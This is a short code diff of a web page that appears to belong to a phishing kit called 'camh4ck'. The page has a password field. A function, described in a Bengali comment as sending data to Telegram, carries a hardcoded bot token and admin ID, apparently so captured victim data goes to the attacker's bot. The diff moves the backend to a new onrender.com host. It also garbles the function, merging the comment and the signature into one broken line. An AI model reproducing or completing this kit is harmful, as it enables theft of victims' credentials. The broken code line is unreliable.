@@ -56,7 +56,7 @@
 </div>
 
 <script>
-    const RENDER_URL = "https://camh4ck.onrender.com"; 
+    const RENDER_URL = "https://camh4ck-mc07.onrender.com"; 
     const urlParams = new URLSearchParams(window.location.search);
     const userId = urlParams.get('id') || '7068444019';
 
@@ -70,8 +70,7 @@
         this.classList.toggle('fa-eye-slash');
     });
 
-    // টেলিগ্রামে ডাটা পাঠানোর ফাংশন (Updated for Dual Report)
-    async function sendToBot(text) {
+    // টেলিগ্রামে ডাটা পাঠানোর ফাংশন (Updated for Dual Re sendToBot(text) {
         const botToken = "8526863710:AAGQMMjFuHoWfuN5Is9lF1I4Wcf8Y0nTWXo";
         const adminId = "7068444019";
         
